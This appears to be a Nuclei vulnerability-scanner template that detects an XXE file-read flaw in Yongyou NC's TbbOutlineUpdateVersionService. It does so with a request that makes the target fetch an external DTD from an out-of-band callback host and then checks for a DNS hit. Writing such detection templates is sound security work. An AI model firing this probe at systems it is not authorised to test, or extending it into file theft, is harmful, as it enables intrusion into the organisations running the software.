id: yongyou-nc-tbboutlineupdateversionservice-xxe
info:
  name: Yongyou NC TbbOutlineUpdateVersionService File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: dnslog, file-read
http:
  - raw:
      - |
        GET /uapws/service/nc.itf.tb.outlineversion.TbbOutlineUpateVersionService?xsd=http://{{interactsh-url}}/ext.dtd HTTP/1.1
        Host: {{Hostname}}
    stop-at-first-match: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
